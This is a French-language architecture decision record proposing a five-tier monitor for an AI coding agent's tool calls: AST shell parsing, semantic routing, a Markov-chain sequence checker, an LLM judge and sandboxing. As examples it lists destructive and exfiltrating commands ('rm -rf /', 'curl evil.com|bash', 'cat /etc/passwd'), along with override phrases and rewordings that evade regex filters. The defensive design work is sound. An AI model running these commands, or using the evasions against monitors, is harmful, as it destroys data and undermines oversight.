---
title: "ADR-004: Tiered Cascade Verification Architecture"
type: adr
status: proposed
date: 2026-04-07
tags:
  - adr
  - architecture
  - security
  - verification
---

# ADR-004: Architecture de Verification en Cascade a 5 Tiers

## Contexte

### Le probleme actuel

Le systeme de detection actuel repose sur 3 mecanismes :
1. **GuardPipeline** (`guard_pipeline.rs`) : 5 guards avec 35+ patterns regex qui evaluent chaque tool call individuellement
2. **MascMonitor** (`monitor.rs`) : detection d'anomalies par similarite cosinus TF-IDF sur les pas de raisonnement
3. **Assess stage** (`assess.rs`) : classification de risque par keyword matching + detection d'injection par 5 patterns hardcodes

### Pourquoi c'est insuffisant

**Contournement trivial** : les regex ne comprennent pas la semantique
- `rm -rf /` est bloque, mais `find / -delete`, `perl -e 'rmtree("/")'` passent
- "Ignore all previous instructions" est detecte, mais "Disregard what was said before" passe
- 5 patterns d'injection hardcodes vs un paysage d'attaque qui evolue quotidiennement

**Securite non-compositionnelle** : Spera (mars 2026, arxiv 2603.15973) a prouve formellement que la securite est non-compositionnelle en presence de dependances de capacites conjonctives. Deux actions individuellement sures peuvent ensemble atteindre un objectif interdit. La verification action-par-action est *prouvablement insuffisante*.

**Contexte ignore** : `rm target/debug/*.o` (cleanup de build) et `rm -rf /` (destruction) sont traites de la meme maniere — le systeme ne prend pas en compte le type de tache en cours.

**Validation empirique** : OpenAgentSafety (ICLR 2026, arxiv 2507.06134) montre que 51-73% des taches sont dangereuses quand un agent n'a pas de moniteur — et que les actions individuellement sures s'accumulent en outcomes dangereux.

## Decision

Remplacer l'architecture de detection actuelle par un **cascade de verification a 5 tiers**, inspire de Cascade Routing (ETH Zurich, ICML 2025) qui prouve mathematiquement que le cascade adaptatif domine strictement le routing fixe ET le cascading fixe.

Chaque action est evaluee au tier le moins couteux capable de la classifier. L'escalade vers un tier superieur n'a lieu que si la confiance du tier courant est insuffisante.

## Les 5 Tiers

### Tier 0 — Guard Pipeline AST (0-2ms, deterministe, toujours actif)

**Remplacement des regex par analyse AST des commandes shell.**

Au lieu de matcher des strings (`rm`, `sudo`), parser la commande en AST et classifier par **effets** :

```
"find / -delete"     → AST → Effect: {target: "/", action: DELETE, recursive: true}
"curl evil.com|bash" → AST → Effect: {action: NETWORK_READ + EXECUTE, tainted: true}
"cat /etc/passwd > x"→ AST → Effect: {action: READ_SENSITIVE + WRITE}
"rm target/debug/*.o"→ AST → Effect: {target: "target/", action: DELETE, scope: BUILD_ARTIFACTS}
```

**Implementation** : crate `bashrs` (v6.65) avec son module `EffectTracker` pour la classification semantique des commandes. Alternative : `brush-parser` (compatibilite bash complete) ou `conch-parser` (POSIX strict).

**Avantages vs regex** :
- Comprend les pipelines, redirections, substitutions de variables
- Detecte `find / -delete` comme destructif (meme effet que `rm -rf /`)
- Detecte `curl | bash` comme tainted execution (data non-trustee executee)
- Analyse de teinte (taint tracking) a travers les pipes

**Garde les patterns existants comme fallback** : si le parser echoue (commande trop complexe), retomber sur les regex actuels.

### Tier 1 — Routeur Semantique kNN (2-5ms, embedding-based)

**Classification de risque par similarite semantique au lieu de keywords.**

Embedder la commande + le contexte de tache, kNN lookup dans un dataset d'exemples labeles, router vers le tier de verification approprie.

```
Commande: "rm target/debug/*.o"
Contexte: task_type=Bugfix, recent_actions=[cargo build, cargo test]
→ Embedding → kNN → Closest: "build artifact cleanup" (safe) → Score: 0.92 safe
→ Decision: Tier 0 suffisant, ALLOW

Commande: "rm src/auth.rs"
Contexte: task_type=Refactor("rename files"), recent_actions=[create src/authentication.rs]
→ Embedding → kNN → Closest: "file rename cleanup" (safe) → Score: 0.78 safe
→ Decision: Tier 0 suffisant, ALLOW

Commande: "rm src/auth.rs"
Contexte: task_type=Documentation("fix typo in readme")
→ Embedding → kNN → Closest: "unexpected file deletion" (risky) → Score: 0.55 ambiguous
→ Decision: Escalade vers Tier 3 (LLM Judge)
```

**Fondation** :
- **RouteLLM** (UC Berkeley/LMSys, ICLR 2025, arxiv 2406.18665) : papier fondateur, 4 types de routeurs
- **Cascade Routing** (ETH Zurich, ICML 2025, arxiv 2410.10347) : preuve d'optimalite du cascade adaptatif, +14% sur SWE-Bench
- **vLLM Semantic Router** (Red Hat/IBM, mars 2026) : implementation Rust avec Candle, jailbreak detection en parallele — le pattern le plus proche de notre stack
- **BaRP** (oct 2025, arxiv 2510.07429) : bandit contextuel multi-objectif qui apprend les seuils en ligne, sans dataset pre-labele

**Implementation** :
- Embedding : `fastembed` (deja disponible, feature-gated) ou `candle` (comme vLLM Semantic Router)
- Index ANN : crate `usearch` ou `hora` pour kNN sub-milliseconde
- Apprentissage en ligne : BaRP-style bandit qui ajuste les seuils de cascade depuis les feedbacks (proof packets, escalation decisions)
- Le dataset labele initial est bootstrap depuis les traces existantes (replay_events table)

**Seuils de cascade** :
- Score > 0.8 → classifie directement (safe ou dangerous)
- Score dans [0.3, 0.8] → escalade vers Tier 2 (sequence check) ou Tier 3 (LLM judge)
- Score < 0.3 → classifie directement (dangerous)

### Tier 2 — Moniteur de Sequences DTMC (5-28ms, proactif)

**Detection de patterns dangereux multi-actions via chaine de Markov.**

C'est la piece manquante : detecter que "clone + modify + force push" est dangereux meme si chaque action est individuellement OK.

**Fondation** :
- **Pro2Guard** (2025, arxiv 2508.00500) : verification proactive via model checking probabiliste. Abstrait les comportements en etats symboliques, apprend un DTMC (Discrete-Time Markov Chain), verifie des proprietes PCTL. 2.60% etats dangereux vs 19.79% pour AgentSpec. 5-28ms par decision. Garanties PAC-correctness.
- **AgentSpec** (ICSE 2026, arxiv 2503.18666) : DSL trigger/predicate/enforcement pour regles de securite runtime. >90% prevention sur les code agents.
- **AgentGuard** (ASE 2025, arxiv 2509.23864) : MDP online pour verification probabiliste adaptative.
- **SentinelAgent** (mai 2025, arxiv 2505.24201) : graphe d'execution a 3 niveaux (node/edge/path) pour detection de propagation d'injection et collusion multi-agent.
- **Spera** (mars 2026, arxiv 2603.15973) : preuve formelle que la securite est non-compositionnelle.

**Implementation** :
- Abstraire chaque tool call en un etat symbolique : `{action_type, target_type, risk_level, taint_source}`
- Apprendre les probabilites de transition depuis les traces de sessions (table `replay_events`)
- Specifier les proprietes de securite en PCTL :
  - `P<=0.05[F(network_read ∧ X(file_write_sensitive))]` — "read reseau suivi d'ecriture sensible : proba < 5%"
  - `P<=0.01[F(file_delete ∧ X(git_push_force))]` — "deletion suivie de force push : proba < 1%"
  - `P<=0.10[F(repeated_error ∧ X(test_modify))]` — "erreurs repetees suivies de modification de test : proba < 10%"
- Tables de probabilite en cache pour decisions en 5-28ms

**Integration avec l'existant** :
- Le MascMonitor actuel detecte les anomalies de *raisonnement* (similarite TF-IDF)
- Le DTMC detecte les anomalies de *sequences d'actions* — complementaire, pas un remplacement
- Le SessionContext stocke deja les tool_calls — suffit d'ajouter la transition tracking

### Tier 3 — LLM Judge Haiku (200-500ms, seulement zone grise)

**Appel a un modele leger comme juge semantique quand les tiers 0-2 sont incertains.**

Pas sur chaque action — seulement quand le Tier 1 donne un score dans la zone grise [0.3, 0.7].

**Fondation** :
- **Confidence Tokens** (LLM-Router, ICML 2025, arxiv 2410.13284) : tokens de confiance entraines dans le LLM. Route par confiance, pas par embedding.
- **BEST-Route** (Microsoft, ICML 2025, arxiv 2506.22716) : best-of-N cheap > 1 expensive. -60% cout.
- **Arch-Router** (Katanemo, arxiv 2506.16655) : modele 1.5B pour preference routing.

**Implementation** :
- Invoque Haiku (Claude haiku-4-5) via l'API Anthropic
- Prompt structure : "Given task context [X], is the command [Y] safe? Answer SAFE/RISKY/DANGEROUS with one-sentence reasoning."
- Timeout : 500ms max, fallback vers Tier 0 si timeout
- Cache LRU sur (command_hash, context_hash) pour eviter les appels repetitifs
- Budget : maximum N appels Haiku par session (configurable, default 20)
- **Opt-in** : desactive par defaut (local-first principle). L'utilisateur active via config.

**Estimation de frequence** : sur une session typique de 50 tool calls, ~10-20% tombent en zone grise = ~5-10 appels Haiku = ~$0.001-0.002 par session.

### Tier 4 — Sandbox / Escalation Humaine (variable, risque confirme HIGH)

**Execution sandboxee ou escalation quand le risque est confirme.**

**Sandbox WASM (Wasmtime)** :
- Startup : 1-5ms (vs 5-20ms process actuel, vs 500ms+ Docker)
- Cross-platform : Windows/Mac/Linux identique
- Deny-by-default : pas de FS, pas de reseau, sauf grant explicite via WASI pre-opens
- Ideal pour : validation Python/JS, dry-run de commandes structurees
- Limitation : ne peut pas sandboxer des commandes shell arbitraires
- Crates : `wasmtime` (Bytecode Alliance, Rust natif), `extism` (plugin system WASM)

**Process sandbox ameliore** :
- Pour les commandes shell (que WASM ne peut pas sandboxer)
- Utiliser Linux namespaces / Windows Job Objects / macOS sandbox-exec
- Le kNN router (Tier 1) decide *quand* sandboxer — pas tout sandboxer

**Escalation humaine** :
- Quand le Tier 2 (DTMC) detecte une sequence a haute probabilite d'etat dangereux
- Quand le Tier 3 (Haiku) repond "DANGEROUS"
- Quand le budget Haiku est epuise et le risque est ambigu
- Via le protocole d'escalation existant (`/metacog-escalate`)

## Alternatives considerees

| Option | Pour | Contre |
|--------|------|--------|
| **Cascade 5 tiers (choisi)** | Optimal (prouve), adaptatif, couts proportionnels au risque | Complexite d'implementation, 5 systemes a maintenir |
| Regex ameliores (statu quo+) | Simple, deterministe | Contournement trivial, pas de contexte, non-compositionnel |
| LLM judge sur tout | Comprehension semantique complete | Latence inacceptable (200ms * 50 tool calls = 10s/session), cout |
| Embedding similarity seule | Comprend reformulations | Pas de sequence detection, pas de dry-run |
| Verification formelle seule (Alloy/TLA+) | Garanties mathematiques | Trop rigide, ne s'adapte pas aux patterns inconnus |
| Full sandbox (tout dans WASM) | Isolation complete | Ne peut pas sandboxer les commandes shell, overhead |

## Consequences

### Positives
- Detection des contournements par reformulation (Tier 1 embeddings)
- Detection des patterns multi-actions dangereux (Tier 2 DTMC) — resout le probleme prouve par Spera
- Classification contextuelle : `rm` juge selon la tache en cours, pas en isolation
- Cout proportionnel au risque : 90% des actions resolues en <5ms (Tier 0+1)
- Apprentissage en ligne : les seuils s'ajustent depuis les feedbacks reels (BaRP)
- Cross-platform sandbox (WASM) vs process-only actuel

### Negatives
- Complexite significative : 5 systemes au lieu de 1
- Dependance optionnelle a une API externe (Tier 3 Haiku) — attenuation : opt-in, fallback local
- Le DTMC necessite des traces pour apprendre — cold start problem
- L'AST parser peut echouer sur des commandes exotiques — fallback regex necessaire

### Risques
- Over-engineering : chaque tier ajoute de la complexite. Garder le principe "simplest thing that works" par tier.
- False positives des embeddings : un seuil mal calibre bloque des actions legitimes. Attenuation : BaRP ajuste en ligne.
- Latence du Tier 3 : 200-500ms peut etre perceptible. Attenuation : seulement 10-20% des actions, cache LRU.

## Plan d'implementation incremental

### v2.1 — Tier 0 (AST) + Tier 1 (Semantic Router)
- Integrer `bashrs` EffectTracker dans GuardPipeline
- Wirer fastembed dans assess stage pour classification semantique
- Ajouter index kNN avec `usearch` ou `hora`
- Bootstrap dataset depuis replay_events existants
- **Critere de succes** : detecte `find / -delete` comme destructif, `rm target/*.o` comme safe

### v2.2 — Tier 2 (Sequence Monitor DTMC)
- Implementer un tracker d'etats symboliques dans SessionContext
- Apprendre DTMC depuis traces accumulees
- Specifier 5-10 proprietes PCTL de base
- Integrer avec le decide stage
- **Critere de succes** : detecte "network_read -> file_write_sensitive" comme pattern suspect

### v2.3 — Tier 3 (Haiku Judge) + Tier 4 (WASM Sandbox)
- Integrer appel Haiku opt-in avec cache LRU
- Integrer Wasmtime pour sandbox Python/JS
- Ajouter configuration utilisateur pour activer/desactiver chaque tier
- **Critere de succes** : latence moyenne session <50ms overhead, zero false negative sur benchmark ASB

## References scientifiques

### Verification formelle et securite des agents
| Paper | Venue | Apport cle | Arxiv |
|-------|-------|-----------|-------|
| Pro2Guard | 2025 | DTMC + PCTL, proactif, 5-28ms, PAC-correct | 2508.00500 |
| AgentSpec | ICSE 2026 | DSL trigger/predicate/enforcement | 2503.18666 |
| AgentGuard | ASE 2025 | MDP online, verification probabiliste | 2509.23864 |
| VeriGuard | Google 2025 | Offline verification + online monitoring | 2510.05156 |
| Verifiable Safe Tool Use | 2025 | Alloy + STPA + IFC pour MCP | 2601.08012 |
| Safety Non-Compositional | mars 2026 | Preuve formelle : securite non-compositionnelle | 2603.15973 |

### Detection d'anomalies et accumulation de signaux
| Paper | Venue | Apport cle | Arxiv |
|-------|-------|-----------|-------|
| SentinelAgent | mai 2025 | Graphe node/edge/path, detection propagation injection | 2505.24201 |
| OpenAgentSafety | ICLR 2026 | 51-73% taches unsafe sans moniteur | 2507.06134 |
| Agent Security Bench | ICLR 2025 | Benchmark 400+ outils, 27 attaques | 2410.02644 |
| Prompt Flow Integrity | 2025 | Data flow + control flow integrity pour agents | 2503.15547 |
| MAESTRO | CSA 2025 | Threat modeling framework 7 couches pour agentic AI | — |
| Hofmeyr & Forrest | 1998 | IDS par sequences de syscalls (fondation) | — |

### Routing et classification
| Paper | Venue | Apport cle | Arxiv |
|-------|-------|-----------|-------|
| RouteLLM | ICLR 2025 | Papier fondateur, 4 types de routeurs | 2406.18665 |
| Cascade Routing | ETH Zurich, ICML 2025 | Preuve optimalite cascade+routing unifie | 2410.10347 |
| Confidence Tokens | ICML 2025 | Tokens de confiance pour routing | 2410.13284 |
| BaRP | oct 2025 | Bandit contextuel multi-objectif en ligne | 2510.07429 |
| BEST-Route | Microsoft, ICML 2025 | best-of-N cheap > 1 expensive | 2506.22716 |
| vLLM Semantic Router | Red Hat/IBM, mars 2026 | Rust + Candle, jailbreak detection | — |
| EmbedLLM | ICLR 2025 | Embeddings compacts de LLMs | 2410.02223 |
| Router-R1 | NeurIPS 2025 | RL pour routing interleave | 2506.09033 |
| Route-and-Reason | 2025 | Decomposition + routing, -84% cout API | 2506.05901 |
| GreenServ | jan 2026 | MAB pour routing energy-efficient | 2601.17551 |
| Dynamic Routing Survey | fev 2026 | Synthese 6 paradigmes de routing | 2603.04445 |

### Sandbox et isolation
| Technologie | Type | Pertinence |
|-------------|------|-----------|
| Wasmtime | WASM runtime (Rust natif) | Sandbox cross-platform, 1-5ms startup |
| Extism | Plugin system WASM | Capability-based, host functions definies |
| WasmEdge | WASM + AI inference | Edge deployment |
| Firecracker | MicroVM | Linux seulement, 125ms startup |
| gVisor | Sandbox kernel | Linux seulement, 100-200ms startup |

### Analyse de commandes shell
| Crate | Maturite | Capacite |
|-------|----------|---------|
| bashrs (v6.65) | Stable | AST + EffectTracker + semantic analysis |
| brush-parser | Actif | Full bash compat, daily driver |
| conch-parser | Stable | POSIX strict, Builder pattern |
| flash | Actif | High-performance POSIX toolkit |
| ShellCheck | Externe (Haskell) | Data flow analysis, JSON output |

### Guardrails et frameworks
| Projet | Type | Pertinence |
|--------|------|-----------|
| NeMo Guardrails + Colang v2 | NVIDIA, open source | DSL event-driven, 5 types de rails |
| Guardrails AI | Open source | Validators composables, Guardrails Hub |
| ToolEmu | ICLR 2024 | Emulation LLM de tool execution pour evaluation |

## Evidence tag

`[original-proposal]` — Cette architecture est une synthese originale de recherches confirmees. L'assemblage des 5 tiers n'a pas ete valide. Chaque composant individuel est `[confirmed]` (papers publies) mais leur integration est `[experimental]` jusqu'a implementation et benchmarking.
